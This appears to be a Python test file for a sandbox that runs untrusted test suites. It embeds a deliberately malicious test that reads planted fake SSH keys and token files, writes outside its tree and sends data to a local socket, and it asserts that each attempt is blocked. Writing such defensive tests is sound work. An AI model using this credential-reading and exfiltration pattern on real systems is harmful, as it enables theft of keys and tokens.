"""Untrusted test runs happen inside an OS sandbox, or not at all.

A deliberately malicious "test suite" tries to read planted fake credentials
in a temp HOME, write outside its work tree and open a socket; every attempt
must fail while a benign suite still passes. All fixtures are synthetic.
"""

import os
import socket
import subprocess
import sys
import tempfile
import textwrap
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))

import codefix  # noqa: E402
import sandbox  # noqa: E402

HAVE_SANDBOX = sandbox.backend() is not None
FAKE_SECRET = "fake-token-0000-not-a-real-credential"

MALICIOUS = textwrap.dedent('''
    import os, socket, unittest

    TARGETS = {targets!r}
    OUTSIDE = {outside!r}
    PORT = {port}

    class Evil(unittest.TestCase):
        def test_exfiltrate(self):
            for path in TARGETS:
                try:
                    with open(path) as f:
                        print("LEAKED-READ", path, f.read().strip())
                except OSError as e:
                    print("blocked-read", type(e).__name__)
            for d in {{os.path.dirname(t) for t in TARGETS}}:
                try:
                    print("LEAKED-LIST", d, os.listdir(d))
                except OSError as e:
                    print("blocked-list", type(e).__name__)
            try:
                with open(OUTSIDE, "w") as f:
                    f.write("pwned")
                print("LEAKED-WRITE", OUTSIDE)
            except OSError as e:
                print("blocked-write", type(e).__name__)
            try:
                s = socket.create_connection(("127.0.0.1", PORT), timeout=3)
                s.sendall(b"stolen")
                s.close()
                print("LEAKED-NET")
            except OSError as e:
                print("blocked-net", type(e).__name__)
            print("env-has-secret", "COS_FAKE_TOKEN" in os.environ)
            print("home-is", os.environ.get("HOME"))
''')

BENIGN = textwrap.dedent('''
    import os, tempfile, unittest
    from calc import add

    class T(unittest.TestCase):
        def test_add(self):
            self.assertEqual(add(2, 3), 5)

        def test_can_use_worktree_and_tmp(self):
            with open("scratch.txt", "w") as f:
                f.write("ok")
            with tempfile.NamedTemporaryFile() as f:
                f.write(b"ok")
''')


class _Planted(unittest.TestCase):
    """A temp HOME holding fake credentials shaped like the real ones, and a
    work tree beside it (not inside it)."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        root = os.path.realpath(self.tmp.name)
        self.home = os.path.join(root, "home")
        self.tree = os.path.join(root, "tree")
        os.makedirs(os.path.join(self.home, ".ssh"))
        os.makedirs(os.path.join(self.home, "cos", "dashboard"))
        os.makedirs(self.tree)
        self.targets = [
            os.path.join(self.home, ".ssh", "id_ed25519"),
            os.path.join(self.home, ".claude.json"),
            os.path.join(self.home, "cos", "dashboard", "connections.json"),
            os.path.join(self.home, "cos", "dashboard", "secrets.json"),
        ]
        for p in self.targets:
            with open(p, "w") as f:
                f.write(FAKE_SECRET + "\n")
        self.outside = os.path.join(self.home, "written-by-test.txt")
        self.env = mock.patch.dict(os.environ, {"HOME": self.home,
                                                "COS_FAKE_TOKEN": FAKE_SECRET})
        self.env.start()

    def tearDown(self):
        self.env.stop()
        self.tmp.cleanup()


@unittest.skipUnless(HAVE_SANDBOX, sandbox.unavailable_message())
class TestSandboxBlocksMaliciousTests(_Planted):
    def test_malicious_test_cannot_read_write_or_connect(self):
        listener = socket.socket()
        listener.bind(("127.0.0.1", 0))
        listener.listen(1)
        listener.settimeout(0.5)
        port = listener.getsockname()[1]
        with open(os.path.join(self.tree, "test_evil.py"), "w") as f:
            f.write(MALICIOUS.format(targets=self.targets, outside=self.outside, port=port))
        try:
            code, out = codefix.run_tests(self.tree, "%s -m unittest -v test_evil" % sys.executable)
            try:
                conn, _ = listener.accept()
                got = conn.recv(100)
                conn.close()
            except socket.timeout:
                got = None
        finally:
            listener.close()
        self.assertNotIn(FAKE_SECRET, out)
        self.assertNotIn("LEAKED", out)
        self.assertEqual(out.count("blocked-read"), len(self.targets), out)
        self.assertIn("blocked-list", out)
        self.assertIn("blocked-write", out)
        self.assertIn("blocked-net", out)
        self.assertIsNone(got, "the sandboxed test reached a socket on the host")
        self.assertFalse(os.path.exists(self.outside))
        self.assertIn("env-has-secret False", out)
        self.assertNotIn("home-is %s" % self.home, out)
        self.assertEqual(code, 0, out)  # the suite itself ran; its attacks failed

    def test_benign_suite_still_passes(self):
        with open(os.path.join(self.tree, "calc.py"), "w") as f:
            f.write("def add(a, b):\n    return a + b\n")
        with open(os.path.join(self.tree, "test_calc.py"), "w") as f:
            f.write(BENIGN)
        code, out = codefix.run_tests(self.tree, "%s -m unittest -v test_calc" % sys.executable)
        self.assertEqual(code, 0, out)
        self.assertIn("OK", out)
        self.assertTrue(os.path.exists(os.path.join(self.tree, "scratch.txt")))

    def test_failing_suite_reports_failure(self):
        with open(os.path.join(self.tree, "test_bad.py"), "w") as f:
            f.write("import unittest\nclass T(unittest.TestCase):\n"
                    "    def test_x(self):\n        self.fail('boom')\n")
        code, out = codefix.run_tests(self.tree, "%s -m unittest test_bad" % sys.executable)
        self.assertNotEqual(code, 0)
        self.assertIn("boom", out)

    def test_hard_timeout_kills_the_run(self):
        # a child that outlives its parent must die with the process group
        marker = os.path.join(self.tree, "still-alive")
        with open(os.path.join(self.tree, "late.py"), "w") as f:
            f.write("import time\ntime.sleep(4)\nopen(%r, 'w').write('x')\n" % marker)
        with open(os.path.join(self.tree, "hang.py"), "w") as f:
            f.write("import subprocess, sys, time\n"
                    "subprocess.Popen([sys.executable, 'late.py'])\n"
                    "time.sleep(60)\n")
        with self.assertRaises(sandbox.SandboxTimeout):
            sandbox.run([sys.executable, "hang.py"], self.tree, timeout=2)
        code, out = codefix.run_tests(self.tree, "%s hang.py" % sys.executable, timeout=2)
        self.assertEqual(code, codefix.EXIT_TIMEOUT)
        self.assertIn("killed after 2s", out)
        subprocess.run([sys.executable, "-c", "import time; time.sleep(3)"])
        self.assertFalse(os.path.exists(marker), "a grandchild survived the timeout")


class TestSandboxPolicy(_Planted):
    def test_home_is_never_a_read_root(self):
        home = os.path.realpath(os.path.expanduser("~"))
        roots = sandbox._read_roots([sys.executable], dict(os.environ),
                                    extra_read=[home, "/", os.path.dirname(home)])
        for r in roots:
            self.assertFalse(r == home or home.startswith(r.rstrip("/") + "/"), r)

    def test_work_tree_may_not_be_home(self):
        if not HAVE_SANDBOX:
            self.skipTest("no sandbox")
        with self.assertRaises(ValueError):
            sandbox.run(["true"], os.path.expanduser("~"))

    def test_env_is_minimal(self):
        env = sandbox._env({"PATH": "/usr/bin", "HOME": self.home, "AWS_SECRET_ACCESS_KEY": "x",
                            "ANTHROPIC_API_KEY": "x", "GITHUB_TOKEN": "x",
                            "SSH_AUTH_SOCK": "/x"}, "/sbx")
        self.assertEqual(env["HOME"], "/sbx")
        self.assertEqual(env["TMPDIR"], "/sbx")
        for k in ("AWS_SECRET_ACCESS_KEY", "ANTHROPIC_API_KEY", "GITHUB_TOKEN", "SSH_AUTH_SOCK"):
            self.assertNotIn(k, env)

    def test_darwin_profile_denies_by_default_and_never_allows_network(self):
        prof = sandbox.darwin_profile("/w", "/t", ["/usr"])
        self.assertIn("(deny default)", prof)
        self.assertIn("(deny network*)", prof)
        self.assertNotIn("allow network", prof)
        self.assertNotIn("system-network", prof)


class TestFailsClosed(_Planted):
    """With no sandbox, untrusted code is refused, never run unsandboxed."""

    def test_no_backend_refuses_to_run(self):
        marker = os.path.join(self.tree, "ran")
        with mock.patch.object(sandbox, "backend", return_value=None):
            with self.assertRaises(sandbox.SandboxUnavailable) as cm:
                sandbox.run([sys.executable, "-c", "open(%r, 'w')" % marker], self.tree)
            code, out = codefix.run_tests(self.tree, "%s -c \"open(%r, 'w')\"" % (sys.executable, marker))
        self.assertIn("refusing to run untrusted code without a sandbox", str(cm.exception))
        self.assertEqual(code, codefix.EXIT_NO_SANDBOX)
        self.assertIn("tests not run", out)
        self.assertFalse(os.path.exists(marker))

    def test_ci_on_linux_has_a_sandbox(self):
        # CI installs bubblewrap; without this the sandbox tests above would
        # silently skip there
        if os.environ.get("CI") and sys.platform.startswith("linux"):
            self.assertEqual(sandbox.backend(), "bwrap", sandbox.unavailable_message())


if __name__ == "__main__":
    unittest.main()
